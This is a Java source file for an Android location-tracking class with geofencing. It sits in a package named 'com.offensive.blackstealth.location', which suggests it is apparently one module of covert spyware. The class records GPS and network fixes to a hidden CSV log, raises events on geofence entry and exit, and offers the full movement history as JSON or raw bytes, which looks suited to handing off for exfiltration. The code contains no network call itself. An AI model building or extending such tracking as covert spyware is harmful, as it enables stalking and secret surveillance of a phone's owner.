package com.offensive.blackstealth.location;

import android.Manifest;
import android.content.Context;
import android.location.*;
import android.os.Bundle;
import android.os.Looper;
import android.util.Log;
import java.io.*;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.concurrent.*;

/**
 * Location Tracker with Geofencing
 * GPS and Network location tracking
 */
public class LocationTracker implements LocationListener {
    private static final String TAG = "LocationTracker";
    
    private Context context;
    private LocationManager locationManager;
    private Location currentLocation;
    private Location lastLocation;
    private ExecutorService executor;
    private ScheduledExecutorService scheduler;
    private File logFile;
    private List<Geofence> geofences;
    private boolean isTracking = false;
    private long minTimeMs = 60000; // 1 minute
    private float minDistanceM = 10; // 10 meters
    private LocationCallback callback;
    private SimpleDateFormat dateFormat;
    
    public static class Geofence {
        public String id;
        public double latitude;
        public double longitude;
        public float radiusMeters;
        public boolean inside = false;
        
        public Geofence(String id, double lat, double lng, float radius) {
            this.id = id;
            this.latitude = lat;
            this.longitude = lng;
            this.radiusMeters = radius;
        }
    }
    
    public interface LocationCallback {
        void onLocationUpdate(Location location);
        void onGeofenceEnter(Geofence geofence, Location location);
        void onGeofenceExit(Geofence geofence, Location location);
        void onError(String error);
    }
    
    public LocationTracker(Context context) {
        this.context = context;
        this.locationManager = (LocationManager) 
            context.getSystemService(Context.LOCATION_SERVICE);
        this.executor = Executors.newSingleThreadExecutor();
        this.scheduler = Executors.newScheduledThreadPool(1);
        this.geofences = new ArrayList<>();
        this.dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);
        
        // Setup log file
        File dir = new File(context.getFilesDir(), "location");
        dir.mkdirs();
        logFile = new File(dir, "track_" + System.currentTimeMillis() + ".csv");
        initLogFile();
    }
    
    private void initLogFile() {
        try (PrintWriter pw = new PrintWriter(new FileWriter(logFile))) {
            pw.println("timestamp,latitude,longitude,altitude,accuracy,speed,provider");
        } catch (Exception e) {}
    }
    
    public void setCallback(LocationCallback callback) {
        this.callback = callback;
    }
    
    public void setUpdateInterval(long minTimeMs, float minDistanceM) {
        this.minTimeMs = minTimeMs;
        this.minDistanceM = minDistanceM;
    }
    
    /**
     * Start location tracking
     */
    public void startTracking() {
        if (isTracking) return;
        isTracking = true;
        
        try {
            // Request GPS updates
            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                locationManager.requestLocationUpdates(
                    LocationManager.GPS_PROVIDER,
                    minTimeMs, minDistanceM, this, Looper.getMainLooper());
            }
            
            // Request Network updates
            if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                locationManager.requestLocationUpdates(
                    LocationManager.NETWORK_PROVIDER,
                    minTimeMs, minDistanceM, this, Looper.getMainLooper());
            }
            
            // Get last known location
            Location lastGps = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            Location lastNetwork = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            
            if (lastGps != null) {
                currentLocation = lastGps;
            } else if (lastNetwork != null) {
                currentLocation = lastNetwork;
            }
            
            Log.i(TAG, "Location tracking started");
            
        } catch (SecurityException e) {
            Log.e(TAG, "Location permission denied");
            if (callback != null) callback.onError("Permission denied");
        }
    }
    
    /**
     * Stop location tracking
     */
    public void stopTracking() {
        isTracking = false;
        try {
            locationManager.removeUpdates(this);
            Log.i(TAG, "Location tracking stopped");
        } catch (Exception e) {}
    }
    
    /**
     * Get current location
     */
    public Location getCurrentLocation() {
        return currentLocation;
    }
    
    /**
     * Get current location as JSON
     */
    public String getLocationJson() {
        if (currentLocation == null) return "{}";
        
        return String.format(Locale.US,
            "{\"latitude\":%.6f,\"longitude\":%.6f,\"altitude\":%.2f," +
            "\"accuracy\":%.2f,\"speed\":%.2f,\"bearing\":%.2f," +
            "\"provider\":\"%s\",\"timestamp\":%d}",
            currentLocation.getLatitude(),
            currentLocation.getLongitude(),
            currentLocation.getAltitude(),
            currentLocation.getAccuracy(),
            currentLocation.getSpeed(),
            currentLocation.getBearing(),
            currentLocation.getProvider(),
            currentLocation.getTime());
    }
    
    /**
     * Add geofence
     */
    public void addGeofence(String id, double latitude, double longitude, float radiusMeters) {
        geofences.add(new Geofence(id, latitude, longitude, radiusMeters));
        Log.i(TAG, "Geofence added: " + id);
    }
    
    /**
     * Remove geofence
     */
    public void removeGeofence(String id) {
        geofences.removeIf(g -> g.id.equals(id));
    }
    
    /**
     * Clear all geofences
     */
    public void clearGeofences() {
        geofences.clear();
    }
    
    /**
     * Check geofences
     */
    private void checkGeofences(Location location) {
        for (Geofence geofence : geofences) {
            float[] results = new float[1];
            Location.distanceBetween(
                location.getLatitude(), location.getLongitude(),
                geofence.latitude, geofence.longitude, results);
            
            boolean wasInside = geofence.inside;
            boolean isInside = results[0] <= geofence.radiusMeters;
            
            if (!wasInside && isInside) {
                // Entered geofence
                geofence.inside = true;
                Log.i(TAG, "Entered geofence: " + geofence.id);
                if (callback != null) {
                    callback.onGeofenceEnter(geofence, location);
                }
            } else if (wasInside && !isInside) {
                // Exited geofence
                geofence.inside = false;
                Log.i(TAG, "Exited geofence: " + geofence.id);
                if (callback != null) {
                    callback.onGeofenceExit(geofence, location);
                }
            }
        }
    }
    
    /**
     * Log location to file
     */
    private void logLocation(Location location) {
        executor.submit(() -> {
            try (PrintWriter pw = new PrintWriter(new FileWriter(logFile, true))) {
                pw.printf(Locale.US, "%s,%.6f,%.6f,%.2f,%.2f,%.2f,%s%n",
                    dateFormat.format(new Date(location.getTime())),
                    location.getLatitude(),
                    location.getLongitude(),
                    location.getAltitude(),
                    location.getAccuracy(),
                    location.getSpeed(),
                    location.getProvider());
            } catch (Exception e) {}
        });
    }
    
    /**
     * Calculate distance between two locations
     */
    public static float distanceBetween(Location loc1, Location loc2) {
        float[] results = new float[1];
        Location.distanceBetween(
            loc1.getLatitude(), loc1.getLongitude(),
            loc2.getLatitude(), loc2.getLongitude(), results);
        return results[0];
    }
    
    /**
     * Get location history from log file
     */
    public List<Location> getLocationHistory() {
        List<Location> history = new ArrayList<>();
        try (BufferedReader reader = new BufferedReader(new FileReader(logFile))) {
            String line;
            reader.readLine(); // Skip header
            while ((line = reader.readLine()) != null) {
                String[] parts = line.split(",");
                if (parts.length >= 7) {
                    Location loc = new Location(parts[6]);
                    loc.setLatitude(Double.parseDouble(parts[1]));
                    loc.setLongitude(Double.parseDouble(parts[2]));
                    loc.setAltitude(Double.parseDouble(parts[3]));
                    loc.setAccuracy(Float.parseFloat(parts[4]));
                    loc.setSpeed(Float.parseFloat(parts[5]));
                    history.add(loc);
                }
            }
        } catch (Exception e) {}
        return history;
    }
    
    /**
     * Get raw log data
     */
    public byte[] getLogData() {
        try {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            FileInputStream fis = new FileInputStream(logFile);
            byte[] buffer = new byte[4096];
            int read;
            while ((read = fis.read(buffer)) != -1) {
                baos.write(buffer, 0, read);
            }
            fis.close();
            return baos.toByteArray();
        } catch (Exception e) {
            return new byte[0];
        }
    }
    
    // LocationListener implementation
    
    @Override
    public void onLocationChanged(Location location) {
        lastLocation = currentLocation;
        currentLocation = location;
        
        // Log location
        logLocation(location);
        
        // Check geofences
        checkGeofences(location);
        
        // Notify callback
        if (callback != null) {
            callback.onLocationUpdate(location);
        }
        
        Log.d(TAG, String.format(Locale.US, "Location: %.6f, %.6f (±%.0fm)",
            location.getLatitude(), location.getLongitude(), location.getAccuracy()));
    }
    
    @Override
    public void onStatusChanged(String provider, int status, Bundle extras) {}
    
    @Override
    public void onProviderEnabled(String provider) {
        Log.i(TAG, "Provider enabled: " + provider);
    }
    
    @Override
    public void onProviderDisabled(String provider) {
        Log.w(TAG, "Provider disabled: " + provider);
    }
    
    public void release() {
        stopTracking();
        executor.shutdown();
        scheduler.shutdown();
    }
}
